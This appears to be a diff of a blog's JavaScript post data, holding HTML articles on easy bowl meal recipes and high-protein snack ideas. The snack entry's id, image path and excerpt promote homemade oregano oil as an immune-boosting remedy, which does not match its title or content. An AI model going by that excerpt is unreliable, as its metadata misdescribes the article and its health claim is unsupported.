+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Layer in Vegetables</h3>
+
+<p>Vegetables are what make bowl meals colorful and fresh. Broccoli, carrots, cucumber, tomato, bell peppers, edamame, red onion, corn, kale, roasted sweet potatoes, and avocado all bring something different. Cooked vegetables add comfort, while raw vegetables add crunch and brightness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Finish with Sauce</h3>
+
+<p>A bowl without sauce can feel dry, but the right sauce ties everything together. Teriyaki sauce gives chicken and rice a sweet-savory glaze. Spicy mayo makes salmon poke bowls richer. Peanut sauce transforms shrimp and noodles into a Thai-inspired dinner. Tzatziki adds cool creaminess to Greek gyro bowls and Mediterranean falafel bowls. Tahini dressing is a natural match for vegan Buddha bowls.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Add Toppings for Texture</h3>
+
+<p>Toppings make bowls memorable. Sesame seeds, green onions, feta, seaweed, avocado, cornbread crumbles, salsa, pico de gallo, hummus, and fresh herbs can change the entire eating experience. Even a small topping can add crunch, saltiness, creaminess, or freshness.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Save-Worthy Bowl Meal Ideas for Busy Weeknights</h2>
+
+<p>These bowl combinations are easy to repeat because they use familiar ingredients in flavorful ways. They are also flexible, so you can swap ingredients based on what you have in the fridge.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Teriyaki Chicken Bowl</h3>
+
+<p>A teriyaki chicken bowl is a reliable dinner favorite. Start with steamed rice, then add tender teriyaki chicken, broccoli, carrots, and sesame seeds. The broccoli and carrots bring color and crunch, while the glossy teriyaki sauce makes the chicken rich and savory.</p>
+
+<p>This is a great option when you want takeout-style flavor at home. For extra freshness, add sliced green onions or cucumber. For more heat, drizzle with sriracha or chili crisp.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Beef Taco Bowl</h3>
+
+<p>A beef taco bowl turns taco night into a fork-friendly dinner. Seasoned ground beef, rice, black beans, corn, salsa, and avocado create a filling meal with plenty of flavor. It is hearty, colorful, and easy to assemble in minutes once the beef and rice are cooked.</p>
+
+<p>For a lighter version, use lettuce as part of the base. For a more filling version, add extra beans or a spoonful of Greek yogurt instead of sour cream.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Mediterranean Falafel Bowl</h3>
+
+<p>The Mediterranean falafel bowl is bright, fresh, and satisfying. Quinoa, falafel, hummus, cucumber, tomato, and tzatziki create a bowl that is creamy, crisp, and packed with flavor. This is a strong vegetarian dinner idea because the falafel and hummus provide substance while the vegetables keep everything refreshing.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Warm the falafel before serving and keep the cucumber, tomato, hummus, and tzatziki cool. That temperature contrast makes the bowl taste fresher and more satisfying.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Salmon Poke Bowl</h3>
+
+<p>A salmon poke bowl feels light but still filling. Sushi rice, salmon, edamame, cucumber, seaweed, and spicy mayo create a clean, flavorful dinner with creamy, salty, and fresh elements. This bowl works especially well when you want something cool and refreshing rather than heavy.</p>
+
+<p>For a simple home version, use cooked salmon if raw fish is not your preference. Flaked baked salmon with spicy mayo, cucumber, and edamame still gives you a delicious poke-inspired bowl.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Chipotle Chicken Bowl</h3>
+
+<p>A chipotle chicken bowl is smoky, zesty, and perfect for meal prep. Cilantro-lime rice, chipotle chicken, black beans, corn, and pico de gallo make a bold dinner that tastes fresh and filling. Avocado, shredded lettuce, or a squeeze of lime can make it even better.</p>
+
+<p>This is one of the easiest bowls to prep in batches. Cook rice, beans, and chicken ahead of time, then add fresh pico de gallo when serving.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Thai Peanut Shrimp Bowl</h3>
+
+<p>A Thai peanut shrimp bowl is rich, nutty, and full of texture. Rice noodles, shrimp, bell peppers, edamame, and peanut sauce create a bowl that tastes comforting but still colorful. The peanut sauce is the star, coating the noodles and shrimp with creamy flavor.</p>
+
+<p>Bell peppers add crunch and sweetness, while edamame brings protein and a fresh green pop. A squeeze of lime can brighten the whole bowl.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:26px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">The easiest way to keep bowl meals exciting is to prep neutral ingredients, then change the sauce. Rice, chicken, beans, cucumbers, greens, and roasted vegetables can become Asian-inspired, Mediterranean, Mexican-inspired, or vegan-friendly depending on the dressing and toppings.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">BBQ Pulled Pork Bowl</h3>
+
+<p>A BBQ pulled pork bowl is comfort food in bowl form. Coleslaw, BBQ pulled pork, cornbread crumbles, and green onions create a hearty meal with smoky, sweet, tangy, and crunchy elements. The coleslaw is especially important because it cuts through the richness of the pork.</p>
+
+<p>This is a great way to use leftover pulled pork. Serve it over rice, roasted potatoes, or even a bed of greens depending on how filling you want the meal to be.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Greek Gyro Bowl</h3>
+
+<p>A Greek gyro bowl brings together lemon rice, grilled chicken, tzatziki, cucumber, red onion, and feta. It is tangy, creamy, crisp, and savory. The lemon rice adds brightness, while tzatziki and feta create the classic Greek-inspired flavor profile.</p>
+
+<p>This bowl is excellent for warm-weather dinners because it feels fresh and satisfying without being too heavy. Add tomatoes, olives, or chopped romaine for extra color and crunch.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Vegan Buddha Bowl</h3>
+
+<p>A vegan Buddha bowl is a nourishing plant-based dinner built with brown rice, roasted sweet potatoes, chickpeas, avocado, and tahini dressing. It is hearty, creamy, earthy, and naturally colorful. Roasted sweet potatoes bring sweetness, chickpeas add protein and texture, and tahini dressing ties it all together.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> For a satisfying vegan bowl, include both a creamy element and a protein-rich element. Avocado, tahini, hummus, chickpeas, beans, lentils, or tofu help the bowl feel complete rather than like a simple salad.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Meal Prep Bowl Dinners Without Getting Bored</h2>
+
+<p>Meal prep can sometimes feel repetitive, but bowl meals are one of the easiest ways to avoid that problem. Instead of prepping five identical containers, prepare a few building blocks and mix them in different ways.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Prep Bases in Advance</h4>
+
+<p>Cook rice, quinoa, brown rice, or noodles ahead of time and store them in airtight containers. Rice and quinoa are especially versatile because they work with several cuisines. Cilantro-lime rice can support taco bowls and chipotle chicken bowls, while plain rice can work for teriyaki chicken, salmon poke, and shrimp bowls.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Use Two Proteins for Variety</h4>
+
+<p>Preparing two proteins gives you more choices during the week. For example, make chipotle chicken and falafel, or teriyaki chicken and shrimp. This helps prevent flavor fatigue while keeping prep time manageable.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Keep Fresh Toppings Separate</h4>
+
+<p>Fresh toppings like cucumber, tomato, avocado, coleslaw, pico de gallo, seaweed, and herbs are best added right before eating. This keeps the bowl from becoming soggy and preserves the texture that makes bowl meals so enjoyable.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Make Sauces the Flavor Switch</h4>
+
+<p>Sauces are your best tool for variety. A simple rice and chicken bowl can become teriyaki with one sauce, chipotle with another, or Greek-inspired with tzatziki and lemon. Keep a few sauces ready and dinner becomes much easier.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Ingredients to Keep on Hand for Easy Bowl Meals</h2>
+
+<p>Having a small list of reliable ingredients makes it easier to build quick dinner bowls any night of the week. You do not need an overflowing pantry. You just need a mix of bases, proteins, vegetables, sauces, and toppings.</p>
+
+<ul>
+  <li><strong>Bases:</strong> white rice, brown rice, quinoa, sushi rice, rice noodles, lettuce, or mixed greens.</li>
+  <li><strong>Proteins:</strong> chicken, ground beef, salmon, shrimp, pulled pork, falafel, black beans, chickpeas, tofu, or edamame.</li>
+  <li><strong>Vegetables:</strong> broccoli, carrots, cucumber, tomato, bell peppers, corn, kale, red onion, sweet potatoes, and avocado.</li>
+  <li><strong>Sauces:</strong> teriyaki sauce, peanut sauce, spicy mayo, tzatziki, tahini dressing, salsa, BBQ sauce, and cilantro-lime dressing.</li>
+  <li><strong>Toppings:</strong> sesame seeds, feta, green onions, seaweed, hummus, cornbread crumbles, pico de gallo, and fresh herbs.</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When building a grocery list for bowl meals, choose ingredients that overlap across multiple bowls. Cucumber works in poke, Greek, and Mediterranean bowls. Rice works in teriyaki, taco, chipotle, and salmon bowls. This keeps shopping simple and reduces waste.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Make Bowl Meals Healthier and More Balanced</h2>
+
+<p>Bowl meals can be as indulgent or as wholesome as you want them to be. The key is building balance rather than focusing on restriction. A nourishing bowl includes protein, fiber, healthy fats, colorful produce, and enough flavor to feel satisfying.</p>
+
+<p>For more fiber, use brown rice, quinoa, beans, chickpeas, edamame, or extra vegetables. For more protein, add grilled chicken, shrimp, salmon, tofu, beef, falafel, or legumes. For healthy fats, include avocado, tahini, hummus, salmon, or a drizzle of olive oil-based dressing.</p>
+
+<p>Portioning also matters. A simple visual guide is to fill about half the bowl with vegetables, one quarter with protein, and one quarter with grains or starches. Then add sauce and toppings in amounts that enhance the bowl without overpowering it.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Easy Bowl Meal Combinations to Try Next</h2>
+
+<p>Once you have the basic formula, you can start creating your own combinations. Here are a few simple ideas inspired by classic bowl flavors:</p>
+
+<ol>
+  <li><strong>Sweet and savory:</strong> rice, teriyaki chicken, broccoli, carrots, sesame seeds, and green onions.</li>
+  <li><strong>Fresh and zesty:</strong> cilantro-lime rice, chipotle chicken, black beans, corn, pico de gallo, and avocado.</li>
+  <li><strong>Creamy Mediterranean:</strong> quinoa, falafel, hummus, cucumber, tomato, tzatziki, and herbs.</li>
+  <li><strong>Cool and spicy:</strong> sushi rice, salmon, edamame, cucumber, seaweed, and spicy mayo.</li>
+  <li><strong>Plant-powered:</strong> brown rice, roasted sweet potatoes, chickpeas, kale, avocado, and tahini dressing.</li>
+</ol>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Use one base, one protein, two or more vegetables, one sauce, and one topping.</li>
+    <li>Prep grains and proteins ahead, then add fresh toppings before serving.</li>
+    <li>Change the sauce to create a totally different dinner from the same ingredients.</li>
+    <li>Balance flavor and texture with something creamy, crunchy, fresh, and savory.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Make Dinner Easier with Repeatable Bowl Meals</h2>
+
+<p>Easy bowl meals for dinner are the perfect combination of convenience, flavor, and creativity. They help you turn everyday ingredients into meals that feel colorful, balanced, and exciting. From teriyaki chicken bowls and beef taco bowls to Mediterranean falafel bowls, salmon poke bowls, Thai peanut shrimp bowls, Greek gyro bowls, and vegan Buddha bowls, there is a bowl for almost every craving.</p>
+
+<p>The best part is that bowl meals are endlessly repeatable. Once you have a few bases, proteins, vegetables, sauces, and toppings ready, dinner becomes less stressful and much more enjoyable. Build a bowl around what you love, keep the textures interesting, and let the sauce bring everything together.</p>
+
+<p>Whether you are planning quick weeknight dinners, prepping lunches for the week, or looking for healthier comfort food, bowl meals are a simple habit worth saving. They are flexible, satisfying, and easy to make your own, one delicious combination at a time.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Bowl Meals</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Dinner Bowls</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Dinner Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rice Bowls</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Chicken Bowls</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vegetarian Bowls</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Weeknight Dinners</span>
+</div>
+                `
+            },
+            {
+                id: 'DIY-Oregano-Oil',
+                title: 'High Protein Snack Ideas for Energy, Meal Prep & Healthy Cravings',
+                date: 'April 18, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/DIY-Oregano-Oil.png',
+                excerpt: 'Ready to harness the power of nature? Oregano oil is an incredible natural remedy you can easily make right at home! Whether you want to boost your immune system or support digestion, this DIY herbal recipe is a must-have for your natural apothecary.',
+                content : `
+                <p>High-protein snacks are a simple way to stay energized, curb cravings, and make healthier choices throughout the day. Instead of reaching for snacks that leave you hungry again an hour later, protein-rich snack combos can help you feel satisfied while supporting busy schedules, workouts, meal prep routines, and everyday wellness goals.</p>
+
+<p>The best high-protein snack ideas are not complicated. They combine familiar foods like Greek yogurt, cottage cheese, eggs, turkey slices, tuna, protein shakes, hummus, jerky, cheese, edamame, salmon, and chicken bites with fruits, vegetables, crackers, nuts, or creamy dips. The result is a balanced snack that tastes good, looks appealing, and fits easily into real life.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>High-protein snacks can help support satiety, steady energy, and muscle repair.</li>
+    <li>Simple snack combos are easier to stick with than complicated recipes.</li>
+    <li>Pairing protein with fiber-rich foods like fruit, vegetables, or whole grains creates a more satisfying snack.</li>
+    <li>Portable options such as turkey slices, string cheese, jerky, shakes, and edamame work well for busy days.</li>
+    <li>Meal prepping a few snack combinations ahead of time can make healthy eating feel effortless.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why High-Protein Snacks Are So Useful</h2>
+
+<p>Protein is one of the most satisfying nutrients, which is why high-protein snacks are so popular for people who want better energy, fewer cravings, and more balanced eating habits. A snack with enough protein can feel more complete than a sugary or mostly carb-based snack, especially when it is paired with fiber, healthy fats, or fresh produce.</p>
+
+<p>High-protein snacks are especially helpful between meals, before or after workouts, during long workdays, or when you need something quick before heading out the door. They can also support meal prep goals because many protein snack combos are easy to portion into containers and store in the fridge.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> A smart snack does not need to be large. The goal is to choose a balanced combination that keeps you satisfied. Aim for protein plus something fresh, crunchy, creamy, or fiber-rich so the snack feels complete.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Simple Formula for a Better Protein Snack</h2>
+
+<p>The easiest way to build a better snack is to use a simple formula: protein plus produce or fiber. This combination gives your snack more staying power and makes it more enjoyable to eat. Protein helps with fullness, while fruit, vegetables, beans, whole grains, or nuts add texture, flavor, and nutrients.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Start with a Protein Source</h3>
+
+<p>Choose a protein-rich food that is easy to prepare and enjoyable to eat. Greek yogurt, cottage cheese, eggs, tuna, turkey, chicken, smoked salmon, edamame, string cheese, hummus, jerky, and protein shakes are all practical options. Some are best chilled, while others are easy to pack for travel or work.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Fruit, Vegetables, or Crunch</h3>
+
+<p>Fresh produce and crunchy sides make high-protein snacks feel more satisfying. Berries, kiwi, banana, apple slices, cucumbers, cherry tomatoes, carrots, celery, crackers, rice cakes, and almonds all bring texture and contrast. They also make the snack feel less repetitive.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep It Easy to Repeat</h3>
+
+<p>The best snack ideas are the ones you can actually repeat. Choose combinations that require minimal cooking, simple storage, and ingredients you already like. A snack routine becomes much easier when it does not depend on complicated recipes or long prep times.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">12 High-Protein Snack Ideas to Keep You Full</h2>
+
+<p>These protein snack combos are built around everyday ingredients and balanced pairings. They are ideal for busy schedules, post-workout fuel, afternoon cravings, lunchbox snacks, or quick meal prep.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Greek Yogurt and Berries</h3>
+
+<p>Greek yogurt with berries is a classic high-protein snack because it is creamy, refreshing, and naturally satisfying. The yogurt provides protein, while berries add sweetness, color, and fiber. Blueberries, raspberries, strawberries, and blackberries all work beautifully.</p>
+
+<p>For extra texture, add a small sprinkle of granola, chia seeds, or chopped nuts. Keep the portion simple if you want a lighter snack, or build it into a more filling yogurt bowl when hunger is higher.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Cottage Cheese and Kiwi</h3>
+
+<p>Cottage cheese is a protein-packed snack that pairs well with fruit. Kiwi adds a bright, tangy flavor that balances the mild creaminess of cottage cheese. This combination feels fresh and light while still being filling.</p>
+
+<p>If kiwi is not available, try pineapple, peaches, berries, or sliced banana. Cottage cheese is flexible, affordable, and easy to portion into snack containers.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Hard-Boiled Eggs and Tomatoes</h3>
+
+<p>Hard-boiled eggs are one of the easiest grab-and-go protein snacks. Pairing them with cherry tomatoes adds freshness and a juicy bite. A pinch of salt, pepper, paprika, or everything seasoning can make this simple snack taste more exciting.</p>
+
+<p>Eggs can be boiled in batches and stored in the fridge, making this an excellent option for meal prep. Add cucumber slices or baby carrots if you want more crunch.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Turkey Slices and Cucumber</h3>
+
+<p>Turkey slices with cucumber make a crisp, refreshing snack that is low effort and easy to pack. Roll the turkey around cucumber sticks, or serve the slices side by side for a quick plate. The cucumber adds crunch and hydration, while turkey provides lean protein.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Add a thin spread of hummus, cream cheese, or mustard before rolling turkey slices around cucumber. This adds flavor without making the snack complicated.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Tuna Salad and Crackers</h3>
+
+<p>Tuna salad with crackers is a satisfying snack that feels more substantial than a simple handful of crackers. Tuna brings protein, while crackers add crunch and make the snack easy to eat. You can keep the tuna salad classic or lighten it with Greek yogurt, lemon juice, celery, and herbs.</p>
+
+<p>This combo is especially useful when you want something savory. Choose whole grain crackers for more fiber and a more filling bite.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Protein Shake and Banana</h3>
+
+<p>A protein shake with banana is convenient, quick, and easy to take on the go. The shake provides protein, while banana adds natural sweetness and carbohydrates. This makes it a popular option before a busy day, after a workout, or when you need a snack that does not require utensils.</p>
+
+<p>Blend protein powder with milk or a milk alternative, then add banana for creaminess. You can also include ice, cinnamon, or a spoonful of peanut butter for extra flavor.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:26px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">The most satisfying snack combinations usually include at least two textures. Creamy yogurt with berries, crunchy crackers with tuna, smooth hummus with crisp vegetables, and salty cheese with juicy apple slices all feel more enjoyable because of contrast.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Hummus and Veggie Sticks</h3>
+
+<p>Hummus with veggie sticks is a plant-forward snack that brings together protein, fiber, and crunch. Carrots, celery, cucumbers, bell peppers, and snap peas all pair well with hummus. It is colorful, easy to prep, and ideal for anyone who prefers savory snacks.</p>
+
+<p>While hummus is not as protein-heavy as chicken or tuna, it is still a smart snack when paired with plenty of vegetables. It also works well as part of a larger snack plate.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Beef Jerky and Almonds</h3>
+
+<p>Beef jerky and almonds are a compact, portable snack combo for busy days. Jerky provides protein, while almonds add crunch and healthy fats. This combination is easy to pack in a bag, desk drawer, gym tote, or travel snack kit.</p>
+
+<p>Look for jerky with a flavor you enjoy and pair it with a modest portion of almonds. Since both foods are dense, a little can go a long way.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. String Cheese and Apple</h3>
+
+<p>String cheese and apple slices are simple, balanced, and family-friendly. The cheese gives you protein and creaminess, while apple slices add crisp sweetness and fiber. It is a snack that feels nostalgic but still fits a modern healthy eating routine.</p>
+
+<p>This is also an easy option for lunchboxes or afternoon snacking. Add a few whole grain crackers if you want something more filling.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Edamame with Sea Salt</h3>
+
+<p>Edamame is a protein-rich plant-based snack that is easy to prepare. A sprinkle of sea salt brings out its naturally savory flavor. You can enjoy edamame warm or chilled, making it a flexible option for meal prep.</p>
+
+<p>Keep frozen edamame on hand for quick snacking. It heats quickly and can be portioned into containers for the week.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">11. Smoked Salmon and Cucumber</h3>
+
+<p>Smoked salmon with cucumber is a fresh, savory snack that feels a little more elevated. The cucumber adds crunch and coolness, while the smoked salmon brings rich flavor and protein. You can serve it as small cucumber rounds topped with salmon or simply plate the two together.</p>
+
+<p>For a creamy touch, add a small layer of cream cheese or Greek yogurt spread. Dill, lemon, and cracked pepper also pair well with this combination.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">12. Chicken Bites and Guacamole</h3>
+
+<p>Chicken bites with guacamole make a satisfying snack that tastes hearty without needing a full meal. The chicken provides lean protein, while guacamole adds creaminess, flavor, and healthy fats. This is a great option when you want something savory and filling.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> High-protein snacks are easier to maintain when they feel enjoyable. Choose flavors you genuinely like, then keep the ingredients ready so you are not relying on willpower when hunger hits.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Meal Prep High-Protein Snacks</h2>
+
+<p>Meal prepping snacks can save time and make healthy choices feel automatic. You do not need a full Sunday cooking session. Even 20 minutes of simple prep can give you several ready-to-eat options for the week.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Prep Proteins First</h4>
+
+<p>Boil eggs, portion Greek yogurt, slice turkey, cook chicken bites, or rinse edamame ahead of time. Having protein ready is the biggest step toward faster snacks.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Wash and Cut Produce</h4>
+
+<p>Slice cucumbers, wash berries, cut apples shortly before serving, portion carrots, or prep celery sticks. Fresh produce makes snacks more colorful, hydrating, and filling.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Use Small Containers</h4>
+
+<p>Snack-size containers make portioning easier. Keep wet ingredients separate from crunchy ones when needed. For example, pack tuna salad separately from crackers, or hummus separately from veggie sticks.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Plan for Different Cravings</h4>
+
+<p>Keep both sweet and savory options available. Greek yogurt with berries covers sweet cravings, while tuna and crackers, turkey and cucumber, or chicken bites with guacamole work well when you want something salty and filling.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Best Times to Enjoy Protein Snacks</h2>
+
+<p>High-protein snacks can fit into many parts of the day. They are useful between meals when lunch and dinner are far apart, before a workout when you need steady fuel, after exercise when you want recovery support, or on the go when your schedule is unpredictable.</p>
+
+<p>The key is to snack with intention. A protein snack can prevent extreme hunger later, which may help you make more balanced choices at meals. It can also keep energy more stable during long stretches of work, errands, studying, or travel.</p>
+
